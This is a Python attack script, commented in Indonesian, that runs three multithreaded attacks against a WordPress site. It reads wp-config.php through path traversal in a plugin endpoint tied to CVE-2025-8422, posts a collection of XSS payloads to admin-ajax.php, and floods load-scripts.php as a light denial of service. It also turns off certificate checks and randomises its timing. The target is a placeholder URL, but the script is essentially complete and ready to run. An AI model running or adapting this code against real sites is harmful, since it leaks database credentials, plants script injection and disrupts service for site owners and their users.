import requests
import threading
import time
import random

# Disable SSL warnings untuk verifikasi sertifikat dimatikan pada testing
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

session = requests.Session()

# Fungsi request dengan retry dan handling connection reset dan timeout
def safe_request_get(url, retries=3):
    for attempt in range(retries):
        try:
            response = session.get(url, verify=False, timeout=5)
            return response
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            if attempt < retries - 1:
                wait = random.uniform(0.5, 1.5)
                print(f"Retrying GET after error: {e}, waiting {wait:.2f}s")
                time.sleep(wait)
            else:
                print(f"Request GET failed after {retries} attempts: {e}")
                return None

def safe_request_post(url, data, retries=3):
    for attempt in range(retries):
        try:
            response = session.post(url, data=data, verify=False, timeout=5)
            return response
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            if attempt < retries - 1:
                wait = random.uniform(0.5, 1.5)
                print(f"Retrying POST after error: {e}, waiting {wait:.2f}s")
                time.sleep(wait)
            else:
                print(f"Request POST failed after {retries} attempts: {e}")
                return None

# Payload baca file arbitrary CVE-2025-8422 (update sesuai target)
def attack_file_read(url, count):
    vuln_endpoint = "/wp-content/plugins/propovoice/send_email.php"
    payload = "?file=../../../../wp-config.php"
    for i in range(count):
        full_url = url + vuln_endpoint + payload
        r = safe_request_get(full_url)
        if r and "DB_NAME" in r.text:
            print(f"[FileRead] Request {i+1}: Vulnerable! Config leaked")
        elif r:
            print(f"[FileRead] Request {i+1}: No leak")
        else:
            print(f"[FileRead] Request {i+1} failed")
        time.sleep(random.uniform(0.1, 0.5))

# Payload XSS gabungan script dan payload user input
def attack_xss(url, count):
    xss_endpoint = "/wp-admin/admin-ajax.php"
    # Payload XSS yang diambil dari user (contoh payload panjang)
    xss_payload_raw = '''
<body oninput=javascript:alert(1)><input autofocus>
<math href="javascript:javascript:alert(1)">CLICKME</math> 
<frameset onload=javascript:alert(1)>
<table background="javascript:javascript:alert(1)">
<img src=x onerror=javascript:alert(1)//">
...
'''
    # Contoh sederhana memakai payload XSS yang luas ini sebagai nilai parameter 'content'
    xss_payload = {"action":"bold_pagebuilder_save", "content": xss_payload_raw}
    for i in range(count):
        r = safe_request_post(url + xss_endpoint, data=xss_payload)
        if r:
            print(f"[XSS] Request {i+1}: Status {r.status_code}")
        else:
            print(f"[XSS] Request {i+1} failed")
        time.sleep(random.uniform(0.5, 1.5))

# Flooding endpoint load-scripts.php DoS ringan
def attack_load_scripts(url, count):
    payload = "?c=1&load=editor,common,user-profile,heartbeat"
    for i in range(count):
        full_url = url + "/wp-admin/load-scripts.php" + payload
        r = safe_request_get(full_url)
        if r:
            print(f"[Flood] Request {i+1}: Status {r.status_code}")
        else:
            print(f"[Flood] Request {i+1} failed")
        time.sleep(random.uniform(0.1, 0.5))

def do_multithread_attack(url):
    threads = []
    threads.append(threading.Thread(target=attack_file_read, args=(url,50)))
    threads.append(threading.Thread(target=attack_xss, args=(url,20)))
    threads.append(threading.Thread(target=attack_load_scripts, args=(url,100)))

    for t in threads:
        t.start()
    for t in threads:
        t.join()

if __name__ == "__main__":
    target_url = "https://alamat-web-dummy-anda.com"  # Ganti dengan URL dummy Anda
    do_multithread_attack(target_url)
